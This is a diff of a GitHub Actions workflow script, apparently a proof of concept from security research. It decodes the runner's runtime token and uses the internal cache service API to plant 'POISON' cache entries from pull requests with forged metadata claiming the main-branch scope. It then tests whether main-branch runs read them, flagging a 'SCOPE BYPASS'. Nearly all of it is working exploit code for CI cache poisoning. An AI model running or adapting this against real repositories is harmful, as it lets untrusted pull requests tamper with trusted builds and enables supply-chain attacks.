@@ -14,41 +14,47 @@ jobs:
             const t = process.env.ACTIONS_RUNTIME_TOKEN || '';
             const results = process.env.ACTIONS_RESULTS_URL || '';
             const claims = JSON.parse(Buffer.from(t.split('.')[1], 'base64url').toString());
-            core.info(`event=${context.eventName} ref=${context.ref}`);
-            core.info(`ac         = ${JSON.stringify(claims.ac)}`);
-            core.info(`acsl       = ${claims.acsl}`);
-            core.info(`trust_tier = ${claims.trust_tier}`);
-            core.info(`repository_id = ${claims.repository_id}`);
-            const VER = 'a'.repeat(64);
-            const call = async (method, body, label) => {
-              const url = `${results}twirp/github.actions.results.api.v1.CacheService/${method}`;
-              const r = await fetch(url, { method:'POST',
-                headers:{ 'Authorization':`Bearer ${t}`, 'Content-Type':'application/json' },
-                body: JSON.stringify(body) });
-              const txt = await r.text();
-              core.info(`[${label}] HTTP ${r.status} ${txt.slice(0,260)}`);
-              return { status: r.status, txt };
-            };
-            const MAIN_KEY = 'TRUSTED-MAIN-ONLY';
             const rid = String(claims.repository_id);
-            core.info('--- probes ---');
-            if (context.eventName === 'push') {
-              const c = await call('CreateCacheEntry', { key: MAIN_KEY, version: VER }, 'push: create TRUSTED-MAIN-ONLY');
-              try {
-                const u = JSON.parse(c.txt).signed_upload_url;
-                if (u) {
-                  await fetch(u + '&comp=block&blockid=' + Buffer.from('0'.repeat(16)).toString('base64'),
-                    { method:'PUT', headers:{'x-ms-blob-type':'BlockBlob'}, body:'TRUSTED-CONTENT' });
-                  await call('FinalizeCacheEntryUpload', { key: MAIN_KEY, version: VER, size_bytes: '15' }, 'push: finalize');
-                }
-              } catch(e) { core.info('upload step: ' + e.message); }
+            core.info(`event=${context.eventName} ref=${context.ref}`);
+            core.info(`ac = ${JSON.stringify(claims.ac)}`);
+            const VER = 'b'.repeat(64);
+            const call = async (m, body) => {
+              const r = await fetch(`${results}twirp/github.actions.results.api.v1.CacheService/${m}`,
+                { method:'POST', headers:{Authorization:`Bearer ${t}`,'Content-Type':'application/json'},
+                  body: JSON.stringify(body) });
+              return { status: r.status, txt: await r.text() };
+            };
+            // plant = reserve + upload + finalize, optionally with forged metadata
+            const plant = async (key, meta, label) => {
+              const body = { key, version: VER };
+              if (meta) body.metadata = meta;
+              const c = await call('CreateCacheEntry', body);
+              let url = null; try { url = JSON.parse(c.txt).signed_upload_url } catch {}
+              if (!url) { core.info(`[plant ${label}] reserve FAILED ${c.status} ${c.txt.slice(0,160)}`); return; }
+              const payload = `POISON-FROM-PR-${label}`;
+              const up = await fetch(url, { method:'PUT',
+                headers:{ 'x-ms-blob-type':'BlockBlob', 'Content-Type':'application/octet-stream' },
+                body: payload });
+              const fbody = { key, version: VER, size_bytes: String(payload.length) };
+              if (meta) fbody.metadata = meta;
+              const f = await call('FinalizeCacheEntryUpload', fbody);
+              core.info(`[plant ${label}] reserve=${c.status} upload=${up.status} finalize=${f.status} ${f.txt.slice(0,160)}`);
+            };
+            const read = async (key, label) => {
+              const r = await call('GetCacheEntryDownloadURL', { key, restore_keys: [], version: VER });
+              let ok=false, mk=''; try { const j=JSON.parse(r.txt); ok=j.ok; mk=j.matched_key||'' } catch {}
+              core.info(`[read ${label}] HTTP ${r.status} ok=${ok} matched_key="${mk}"`);
+              return ok;
+            };
+            const FORGED = { repository_id: rid, scope: [{ scope: 'refs/heads/main', permission: '3' }] };
+            if (context.eventName === 'pull_request') {
+              core.info('--- PR plants two entries ---');
+              await plant('PR-PLANTED-FORGED',  FORGED, 'FORGED');   // forged scope=refs/heads/main
+              await plant('PR-PLANTED-CONTROL', null,   'CONTROL');  // benign equivalent, no metadata
             } else {
-              await call('GetCacheEntryDownloadURL', { key: MAIN_KEY, restore_keys: [], version: VER }, 'PR: read main cache (documented ALLOWED)');
-              await call('CreateCacheEntry', { key: 'PR-OWN-SCOPE', version: VER }, 'PR: write own scope (baseline)');
-              await call('CreateCacheEntry', { key: MAIN_KEY, version: VER,
-                metadata: { repository_id: rid, scope: [{ scope: 'refs/heads/main', permission: '3' }] } },
-                'PR: WRITE into refs/heads/main via metadata  <== THE TEST');
-              await call('CreateCacheEntry', { key: 'XREPO', version: VER,
-                metadata: { repository_id: '1', scope: [{ scope: 'refs/heads/main', permission: '3' }] } },
-                'PR: write with repository_id=1 (cross-repo)');
+              core.info('--- main-scope run tries to read what the PR planted ---');
+              const a = await read('PR-PLANTED-FORGED',  'FORGED  (poisoning if ok=true)');
+              const b = await read('PR-PLANTED-CONTROL', 'CONTROL (expected ok=false)');
+              core.info(`VERDICT: forged_readable=${a} control_readable=${b}`);
+              if (a && !b) core.setFailed('SCOPE BYPASS: forged metadata placed the entry in the main scope');
             }
